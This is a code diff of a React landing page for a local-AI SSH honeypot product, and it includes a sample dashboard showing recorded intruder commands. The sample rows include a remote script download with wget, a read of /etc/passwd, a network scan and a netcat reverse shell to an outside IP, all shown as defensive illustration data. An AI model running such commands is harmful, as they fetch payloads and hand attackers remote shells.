@@ -1,95 +1,141 @@
 import { useNavigate } from 'react-router-dom';
-import { motion } from 'framer-motion';
-import { Shield, Terminal, LayoutDashboard, Zap, Lock, Eye } from 'lucide-react';
+import TopNav from './TopNav';
 
 const FEATURES = [
     {
-        icon: Zap,
-        label: 'AI Deception Engine',
-        desc: 'Dynamic honeypots that adapt in real-time to attacker behavior patterns using localized reinforcement learning.',
+        n: '01',
+        title: 'Local AI deception engine',
+        desc: 'Attacker commands are answered by a Llama 3 model running on the host through Ollama. No cloud AI service is involved, and every reply is fake but plausible Ubuntu output.',
     },
     {
-        icon: Eye,
-        label: 'Threat Intelligence',
-        desc: 'ML-scored threat feeds with live attacker profiling, TTP mapping, and global IP reputation scoring.',
+        n: '02',
+        title: 'Real-time scoring & attribution',
+        desc: 'Every command updates the session threat score, banded LOW to CRITICAL as it lands. The source IP is resolved to location, ISP and organisation.',
     },
     {
-        icon: Lock,
-        label: 'Blockchain Forensics',
-        desc: 'Immutable evidence ledgers minted to Sepolia for legal-grade audit trails via localized IPFS pinning.',
+        n: '03',
+        title: 'Forensic PDF export',
+        desc: 'Any session can be exported as a PDF report: attacker profile plus the full command log with timestamps, risk levels and threat scores.',
     },
+];
+
+// Static illustration of a dashboard row set (sample data, clearly labelled as such)
+const PREVIEW_ROWS = [
+    { t: '14:06:12', cmd: 'cat /etc/passwd', sev: 'MEDIUM', score: 41, cls: 'text-ds-med' },
+    { t: '14:06:31', cmd: 'wget http://45.61.13.9/x.sh', sev: 'HIGH', score: 68, cls: 'text-ds-high' },
+    { t: '14:06:49', cmd: 'nmap -sT 10.0.4.0/24', sev: 'HIGH', score: 74, cls: 'text-ds-high' },
 ];
 
 export default function Landing() {
     const navigate = useNavigate();
 
     return (
-        <div className="relative min-h-screen w-full flex flex-col">
-            <div className="app-bg" />
-
-            {/* Nav bar */}
-            <motion.nav
-                initial={{ opacity: 0, y: -20 }}
-                animate={{ opacity: 1, y: 0 }}
-                transition={{ duration: 0.6, ease: 'easeOut' }}
-                className="relative z-20 flex items-center justify-between px-6 md:px-10 py-5 border-b border-white/5 bg-black/40 backdrop-blur-xl"
-            >
-                <div className="flex items-center gap-3 group cursor-pointer">
-                    <div className="relative w-9 h-9 rounded-xl flex items-center justify-center bg-[#2D5BFF]/10 border border-[#2D5BFF]/30">
-                        <Shield size={18} className="text-[#2D5BFF] relative z-10" />
-                    </div>
-                    <span className="text-sm font-black tracking-[0.2em] uppercase text-white">
-                        DeceptiShield
-                    </span>
-                </div>
-                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full border border-emerald-500/30 bg-emerald-500/10">
-                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                    <span className="font-mono text-[10px] sm:text-xs text-emerald-400 font-medium uppercase tracking-widest">System Intact</span>
-                </div>
-            </motion.nav>
+        <div className="min-h-screen w-full bg-ds-bg text-ds-ink">
+            <TopNav />
 
             {/* Hero */}
-            <main className="relative z-10 flex flex-col items-center justify-center flex-1 px-4 py-24 text-center">
-
-                <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.2 }} className="mb-8">
-                    <span className="inline-flex items-center gap-2 font-mono text-[10px] sm:text-xs px-5 py-2.5 rounded-full bg-[#2D5BFF]/10 border border-[#2D5BFF]/20 text-[#2D5BFF] tracking-widest uppercase">
-                        <Zap size={14} /> NEXT-GEN ACTIVE DEFENSE PLATFORM · v3.0
-                    </span>
-                </motion.div>
-
-                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.8, delay: 0.3 }} className="relative max-w-5xl mx-auto">
-                    <h1 className="font-black uppercase text-white pb-4 tracking-tighter" style={{ fontSize: 'clamp(4rem, 10vw, 8rem)', lineHeight: 0.9 }}>
-                        Deceive.<br />Detect.<br />Destroy.
+            <section className="grid grid-cols-1 border-b-2 border-ds-line lg:grid-cols-[minmax(0,1.05fr)_minmax(0,0.95fr)]">
+                <div className="border-b-2 border-ds-line px-6 py-12 sm:px-12 sm:py-16 lg:border-b-0 lg:border-r-2">
+                    <p className="mb-9 font-mono text-[11px] font-bold uppercase tracking-[0.18em] text-ds-acc">
+                        AI SSH honeypot + security operations console
+                    </p>
+                    <h1 className="ds-display m-0 leading-[0.88]" style={{ fontSize: 'clamp(40px, 5.8vw, 104px)' }}>
+                        Deceive.<br />Record.<br /><span className="text-ds-acc">Attribute.</span>
                     </h1>
-                </motion.div>
+                    <p className="mt-9 max-w-[52ch] text-[17px] leading-relaxed text-ds-soft">
+                        DeceptiShield impersonates a vulnerable Ubuntu production database server. An attacker who breaks in
+                        gets a shell that answers back: every command is met with fake but plausible output generated by a
+                        Llama 3 model running on the host machine. Nothing they touch is real, and every command they type is
+                        recorded, scored and attributed.
+                    </p>
 
-                <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.8, delay: 0.5 }} className="mt-8 max-w-2xl text-base sm:text-lg leading-relaxed text-slate-400 font-medium">
-                    DeceptiShield deploys intelligent dynamic honeypots that adapt to adversary TTPs in real-time. Actionable threat feeds. Immutable <span className="text-[#10B981] font-bold">on-chain forensics</span>.
-                </motion.p>
-
-                {/* CTA Buttons */}
-                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6, delay: 0.7 }} className="mt-14 flex flex-col sm:flex-row items-center justify-center gap-5">
-                    <button className="cyber-btn-ghost w-full sm:w-auto flex items-center justify-center gap-3 px-8 py-4 rounded-xl font-bold text-sm tracking-[0.15em] uppercase" onClick={() => navigate('/attacker')}>
-                        <Terminal size={18} /> Launch Attack Sim
-                    </button>
-                    <button className="cyber-btn-primary w-full sm:w-auto flex items-center justify-center gap-3 px-8 py-4 rounded-xl font-bold text-sm tracking-[0.15em] uppercase" onClick={() => navigate('/sessions')}>
-                        <LayoutDashboard size={18} /> SOC Command Center
-                    </button>
-                </motion.div>
-
-                {/* Feature Cards row */}
-                <div className="mt-32 grid grid-cols-1 md:grid-cols-3 gap-8 w-full max-w-[1200px]">
-                    {FEATURES.map(({ icon: Icon, label, desc }, i) => (
-                        <motion.div key={label} initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6, delay: 0.9 + i * 0.15 }} className="premium-glass rounded-3xl p-8 text-left">
-                            <div className="w-12 h-12 rounded-xl flex items-center justify-center mb-6 bg-[#2D5BFF]/10 border border-[#2D5BFF]/30">
-                                <Icon size={22} className="text-[#2D5BFF]" />
-                            </div>
-                            <h3 className="font-black text-sm md:text-base tracking-widest uppercase mb-3 text-white">{label}</h3>
-                            <p className="text-xs md:text-sm leading-relaxed text-slate-400 font-medium">{desc}</p>
-                        </motion.div>
-                    ))}
+                    <div className="mt-11 grid max-w-[640px] grid-cols-1 gap-6 sm:grid-cols-2">
+                        <button
+                            onClick={() => navigate('/attacker')}
+                            className="ds-press cursor-pointer border-2 border-ds-line bg-ds-panel px-[18px] py-5 text-left"
+                        >
+                            <div className="ds-label mb-2">Attacker</div>
+                            <div className="text-[19px] font-bold uppercase leading-tight">Launch attack<br />simulator</div>
+                        </button>
+                        <button
+                            onClick={() => navigate('/sessions')}
+                            className="ds-press cursor-pointer border-2 border-ds-acc bg-ds-panel px-[18px] py-5 text-left"
+                        >
+                            <div className="ds-label mb-2">Dashboard</div>
+                            <div className="text-[19px] font-bold uppercase leading-tight">Open SOC<br />command center</div>
+                        </button>
+                    </div>
                 </div>
-            </main>
+
+                {/* Illustration */}
+                <div className="flex flex-col justify-center bg-ds-panel px-6 py-10 sm:px-10">
+                    <p className="ds-label mb-3">Example: the SOC dashboard during an intrusion</p>
+                    <div className="border-2 border-ds-line bg-ds-bg">
+                        <div className="flex justify-between border-b-2 border-ds-line px-3 py-2 font-mono text-[10px] tracking-[0.12em] text-ds-dim">
+                            <span>SESSION SSH-a3f9c1</span>
+                            <span className="text-ds-acc">● ACTIVE</span>
+                        </div>
+                        <div className="grid min-h-[250px] grid-cols-[92px_1fr]">
+                            <div className="flex flex-col gap-2.5 border-r-2 border-ds-line px-2.5 py-3">
+                                <div className="font-mono text-[10px] tracking-[0.12em] text-ds-dim">THREAT</div>
+                                <div className="ds-display text-[44px] leading-[0.8] text-ds-crit">96</div>
+                                <div className="font-mono text-[10px] tracking-[0.1em] text-ds-crit">CRITICAL</div>
+                                <div className="flex flex-1 flex-col justify-end gap-0.5">
+                                    <div className="h-[26%] bg-ds-crit" />
+                                    <div className="h-[22%] bg-ds-high-band" />
+                                    <div className="h-[22%] bg-ds-med-band" />
+                                    <div className="h-[30%] bg-ds-low-band" />
+                                </div>
+                            </div>
+                            <div className="min-w-0">
+                                <div className="truncate border-b border-ds-hair px-3 py-2 font-mono text-[10px] tracking-[0.12em] text-ds-crit">
+                                    WAN INTERCEPT · 185.220.101.47 · FRANKFURT, DE
+                                </div>
+                                <div className="font-mono text-[11px]">
+                                    {PREVIEW_ROWS.map((r) => (
+                                        <div key={r.t} className="flex gap-2 px-3 py-1.5 text-ds-dim">
+                                            <span>{r.t}</span>
+                                            <span className="flex-1 truncate text-ds-soft">{r.cmd}</span>
+                                            <span className={r.cls}>{r.sev} {r.score}</span>
+                                        </div>
+                                    ))}
+                                    <div className="flex gap-2 bg-ds-crit px-3 py-2 font-bold text-ds-crit-ink">
+                                        <span>14:07:02</span>
+                                        <span className="flex-1 truncate">nc -e /bin/sh 45.61.13.9 4444</span>
+                                        <span>CRITICAL 96</span>
+                                    </div>
+                                </div>
+                                <div className="border-t border-ds-hair px-3 py-2 font-mono text-[11px] leading-relaxed text-ds-dim">
+                                    <span className="text-ds-acc">AI RESPONSE →</span> bash: nc: command not found<br />
+                                    ubuntu@prod-db-01:~$
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <p className="mt-3 font-mono text-[10.5px] leading-relaxed text-ds-faint">
+                        Illustration with sample data. Open the dashboard to see live sessions.
+                    </p>
+                </div>
+            </section>
+
+            {/* Features */}
+            <section className="grid grid-cols-1 border-b-2 border-ds-line md:grid-cols-[repeat(3,minmax(0,1fr))]">
+                {FEATURES.map((f, i) => (
+                    <div
+                        key={f.n}
+                        className={`px-6 py-10 sm:px-9 ${i < FEATURES.length - 1 ? 'border-b-2 border-ds-line md:border-b-0 md:border-r-2' : ''}`}
+                    >
+                        <div className="mb-[18px] font-mono text-[11px] font-bold tracking-[0.16em] text-ds-acc">{f.n}</div>
+                        <h2 className="mb-3 text-[23px] font-bold uppercase leading-[1.1] tracking-[-0.02em]">{f.title}</h2>
+                        <p className="m-0 text-[14.5px] leading-relaxed text-ds-dim">{f.desc}</p>
+                    </div>
+                ))}
+            </section>
+
+            <footer className="flex flex-col gap-2 px-6 py-4 font-mono text-[10.5px] tracking-[0.12em] text-ds-faint sm:flex-row sm:justify-between sm:px-9">
+                <span>LLAMA 3 · LOCAL INFERENCE VIA OLLAMA</span>
+                <span>SSH HONEYPOT LISTENING ON PORT 2222</span>
+            </footer>
         </div>
     );
 }
